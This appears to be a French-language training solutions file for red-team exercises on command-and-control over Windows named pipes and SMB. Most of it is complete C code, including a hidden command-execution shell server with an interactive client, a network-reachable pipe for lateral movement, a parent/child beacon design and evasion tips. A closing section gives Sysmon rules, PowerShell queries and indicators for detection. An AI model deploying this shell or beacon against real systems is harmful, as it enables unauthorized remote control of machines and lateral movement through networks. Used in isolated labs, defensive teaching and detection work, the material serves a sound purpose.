# Solutions : SMB Communication pour C2

## Avertissement

Ces solutions sont fournies a but **EDUCATIF UNIQUEMENT**.

L'utilisation de ce code sans autorisation legale est **ILLEGALE** et passible de poursuites penales.

Usage autorise :
- Lab isole personnel
- Red Team avec contrat
- Pentest autorise

---

## Solution Exercice 1 : Named Pipe Basique

### Server (pipe_server.c)

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\ex1"
#define BUFFER_SIZE 1024

int main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;

    printf("[*] Creating Named Pipe: %s\n", PIPE_NAME);

    // 1. Creer le pipe
    hPipe = CreateNamedPipe(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1,                // Max 1 instance
        BUFFER_SIZE,
        BUFFER_SIZE,
        0,                // Default timeout
        NULL              // Default security
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipe failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Named Pipe created\n");
    printf("[*] Waiting for client...\n");

    // 2. Attendre connexion
    if (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            printf("[!] ConnectNamedPipe failed: %lu\n", GetLastError());
            CloseHandle(hPipe);
            return 1;
        }
    }

    printf("[+] Client connected!\n");

    // 3. Lire message client
    if (ReadFile(hPipe, buffer, BUFFER_SIZE, &bytesRead, NULL)) {
        buffer[bytesRead] = '\0';
        printf("[<] Received: %s\n", buffer);

        // 4. Repondre
        char* response = "Hello from server";
        if (WriteFile(hPipe, response, strlen(response), &bytesWritten, NULL)) {
            printf("[>] Sent: %s\n", response);
        }
    }

    // 5. Cleanup
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    printf("[*] Pipe closed\n");

    return 0;
}
```

### Client (pipe_client.c)

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\ex1"
#define BUFFER_SIZE 1024

int main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;

    printf("[*] Connecting to: %s\n", PIPE_NAME);

    // 1. Attendre disponibilite pipe
    if (!WaitNamedPipe(PIPE_NAME, 5000)) {
        printf("[!] Pipe not available: %lu\n", GetLastError());
        return 1;
    }

    // 2. Se connecter
    hPipe = CreateFile(
        PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Connected to pipe\n");

    // 3. Envoyer message
    char* message = "Hello from client";
    if (WriteFile(hPipe, message, strlen(message), &bytesWritten, NULL)) {
        printf("[>] Sent: %s\n", message);

        // 4. Lire reponse
        if (ReadFile(hPipe, buffer, BUFFER_SIZE, &bytesRead, NULL)) {
            buffer[bytesRead] = '\0';
            printf("[<] Received: %s\n", buffer);
        }
    }

    // 5. Cleanup
    CloseHandle(hPipe);
    printf("[*] Disconnected\n");

    return 0;
}
```

**Compilation** :
```bash
cl pipe_server.c
cl pipe_client.c

# Executer dans deux terminaux :
# Terminal 1:
pipe_server.exe

# Terminal 2:
pipe_client.exe
```

---

## Solution Exercice 2 : Communication Bidirectionnelle

### Server avec execution commandes

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define PIPE_NAME "\\\\.\\pipe\\shell"
#define BUFFER_SIZE 4096

char* ExecuteCommand(char* command) {
    static char output[BUFFER_SIZE * 4];
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

    // Creer pipe pour capturer output
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Error: CreatePipe failed";
    }

    // Configuration processus
    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    // Executer commande
    char cmdLine[BUFFER_SIZE];
    snprintf(cmdLine, BUFFER_SIZE, "cmd.exe /c %s", command);

    if (!CreateProcess(NULL, cmdLine, NULL, NULL, TRUE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "Error: CreateProcess failed";
    }

    CloseHandle(hWritePipe);  // Fermer cote ecriture

    // Lire output
    DWORD bytesRead;
    DWORD totalRead = 0;
    while (ReadFile(hReadPipe, output + totalRead,
                    sizeof(output) - totalRead - 1, &bytesRead, NULL) &&
           bytesRead > 0) {
        totalRead += bytesRead;
    }
    output[totalRead] = '\0';

    // Cleanup
    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return output;
}

int main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];

    printf("[*] Creating shell pipe: %s\n", PIPE_NAME);

    hPipe = CreateNamedPipe(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        1, BUFFER_SIZE, BUFFER_SIZE, 0, NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipe failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[*] Waiting for client...\n");
    ConnectNamedPipe(hPipe, NULL);
    printf("[+] Client connected\n");

    // Loop commandes
    while (1) {
        DWORD bytesRead, bytesWritten;

        // Lire commande
        if (!ReadFile(hPipe, buffer, BUFFER_SIZE, &bytesRead, NULL)) {
            printf("[!] ReadFile failed: %lu\n", GetLastError());
            break;
        }

        buffer[bytesRead] = '\0';
        printf("[<] Command: %s\n", buffer);

        if (strcmp(buffer, "exit") == 0) {
            printf("[*] Exit requested\n");
            break;
        }

        // Executer
        char* output = ExecuteCommand(buffer);

        // Envoyer resultat
        if (!WriteFile(hPipe, output, strlen(output), &bytesWritten, NULL)) {
            printf("[!] WriteFile failed: %lu\n", GetLastError());
            break;
        }

        printf("[>] Sent %lu bytes\n", bytesWritten);
    }

    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
    return 0;
}
```

### Client interactif

```c
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define PIPE_NAME "\\\\.\\pipe\\shell"
#define BUFFER_SIZE 4096

int main() {
    HANDLE hPipe;
    char command[1024];
    char buffer[BUFFER_SIZE];

    if (!WaitNamedPipe(PIPE_NAME, 5000)) {
        printf("[!] Pipe not available\n");
        return 1;
    }

    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE,
                       0, NULL, OPEN_EXISTING, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] Connection failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Connected to shell pipe\n");
    printf("Enter commands (type 'exit' to quit):\n");

    while (1) {
        printf("\nshell> ");
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = '\0';  // Remove newline

        // Envoyer commande
        DWORD written;
        if (!WriteFile(hPipe, command, strlen(command), &written, NULL)) {
            printf("[!] WriteFile failed\n");
            break;
        }

        if (strcmp(command, "exit") == 0) {
            break;
        }

        // Lire resultat
        DWORD read;
        if (!ReadFile(hPipe, buffer, BUFFER_SIZE, &read, NULL)) {
            printf("[!] ReadFile failed\n");
            break;
        }

        buffer[read] = '\0';
        printf("%s", buffer);
    }

    CloseHandle(hPipe);
    printf("\n[*] Disconnected\n");
    return 0;
}
```

---

## Solution Exercice 3 : SMB Lateral Movement

### Server (VM1 - 192.168.1.10)

```c
#include <windows.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\lateral"
#define BUFFER_SIZE 4096

int main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead, bytesWritten;

    printf("[*] Creating network-accessible pipe: %s\n", PIPE_NAME);

    // Pipe accessible reseau (pas de restrictions)
    hPipe = CreateNamedPipe(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,  // Multiple clients
        BUFFER_SIZE,
        BUFFER_SIZE,
        0,
        NULL  // Default security = accessible reseau
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] Failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Pipe created (listening on all interfaces)\n");
    printf("[*] Waiting for network connection...\n");

    while (1) {
        if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
            printf("[+] Client connected!\n");

            // Communication loop
            while (ReadFile(hPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                printf("[<] Received: %s\n", buffer);

                // Echo back
                char response[BUFFER_SIZE];
                snprintf(response, BUFFER_SIZE, "Server got: %s", buffer);
                WriteFile(hPipe, response, strlen(response), &bytesWritten, NULL);

                if (strcmp(buffer, "exit") == 0) break;
            }

            DisconnectNamedPipe(hPipe);
            printf("[*] Client disconnected\n");
        }
    }

    CloseHandle(hPipe);
    return 0;
}
```

### Client (VM2 - 192.168.1.20)

```c
#include <windows.h>
#include <stdio.h>

// IMPORTANT: Remplacer par IP du serveur
#define SERVER_IP "192.168.1.10"
#define PIPE_NAME "\\\\192.168.1.10\\pipe\\lateral"
#define BUFFER_SIZE 4096

int main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    char message[1024];
    DWORD read, written;

    printf("[*] Connecting to: %s\n", PIPE_NAME);

    // Tenter connexion (timeout 10s)
    if (!WaitNamedPipe(PIPE_NAME, 10000)) {
        printf("[!] Pipe not available: %lu\n", GetLastError());
        printf("[!] Check: Firewall, SMB port 445, server running\n");
        return 1;
    }

    hPipe = CreateFile(
        PIPE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[!] Connection failed: %lu\n", GetLastError());
        printf("[!] Check credentials and network connectivity\n");
        return 1;
    }

    printf("[+] Connected via SMB!\n");

    // Test communication
    while (1) {
        printf("\nMessage: ");
        fgets(message, sizeof(message), stdin);
        message[strcspn(message, "\n")] = '\0';

        WriteFile(hPipe, message, strlen(message), &written, NULL);

        if (strcmp(message, "exit") == 0) break;

        ReadFile(hPipe, buffer, BUFFER_SIZE, &read, NULL);
        buffer[read] = '\0';
        printf("[<] Server: %s\n", buffer);
    }

    CloseHandle(hPipe);
    printf("[*] Disconnected\n");
    return 0;
}
```

**Testing** :
```powershell
# VM1: Verifier firewall permet SMB
netsh advfirewall firewall show rule name=all | findstr 445

# Wireshark filter :
smb2 || smb

# Verifier connexions SMB
Get-SmbConnection
```

---

## Solution Exercice 4 : Parent/Child Beacon

**Architecture complete avec relay C2 ◄─► Parent ◄─► Child**

Voir fichier `solution.c` pour implementation complete (trop long pour ce markdown).

**Points cles** :
- Parent : 2 threads (HTTP beacon + SMB server)
- Queue commandes partagee entre threads
- Mutex pour synchronisation
- Child : Execute commandes et retourne resultats
- Heartbeat toutes les 30s pour detecter child mort

---

## Solution Exercice 5 : OPSEC Detection

### Configuration Sysmon

```xml
<Sysmon schemaversion="4.82">
  <EventFiltering>
    <!-- Monitorer creations Named Pipes -->
    <PipeEvent onmatch="include">
      <EventType>CreatePipe</EventType>
    </PipeEvent>

    <!-- Alerter sur pipes suspects -->
    <PipeEvent onmatch="exclude">
      <PipeName condition="begin with">\\Device\\NamedPipe\\chrome</PipeName>
      <PipeName condition="begin with">\\Device\\NamedPipe\\LOCAL\\</PipeName>
    </PipeEvent>
  </EventFiltering>
</Sysmon>
```

### Detection PowerShell

```powershell
# Lister pipes actifs
Get-ChildItem \\.\pipe\ | Where-Object {$_.Name -notlike "chrome*"} |
  Select-Object Name, CreationTime

# Analyser Event Logs SMB
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=5145
} | Select-Object TimeCreated, Message | Out-GridView

# Sysmon pipe events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
  Where-Object {$_.Id -eq 17 -or $_.Id -eq 18} |
  Format-List
```

### Indicateurs de Compromission (IOCs)

**Named Pipes suspects** :
- Noms generiques : `pipe1`, `data`, `cmd`, `shell`
- Patterns inhabituels : caracteres aleatoires
- Creations par processus non-standards

**Connexions SMB anomales** :
- Workstation-to-workstation (pas vers serveur fichiers)
- Connexions sortantes port 445 vers IPs internes
- Multiple failed authentications

**Behavioral** :
- Processus non-browser creant pipes
- Pipes ephemeres (courte duree vie)
- Correlations : pipe creation + network activity

---

## Points Cles

1. **Named Pipes** : IPC Windows puissant pour C2 lateral
2. **SMB Network** : Accessible via `\\server\pipe\name`
3. **OPSEC** : Noms legitimes, cleanup, eviter anomalies
4. **Detection** : Sysmon Event ID 17/18, SMB logs, behavioral
5. **Use Case** : Pivot parent/child, lateral movement, firewall bypass

---

## Compilation Globale

```bash
# Compiler tous les exemples
cl pipe_server.c -o pipe_server.exe
cl pipe_client.c -o pipe_client.exe
cl shell_server.c -o shell_server.exe
cl shell_client.c -o shell_client.exe

# Tester
# Terminal 1:
pipe_server.exe

# Terminal 2:
pipe_client.exe
```

---

**AVERTISSEMENT** : Code educatif uniquement. Usage malveillant = ILLEGAL.
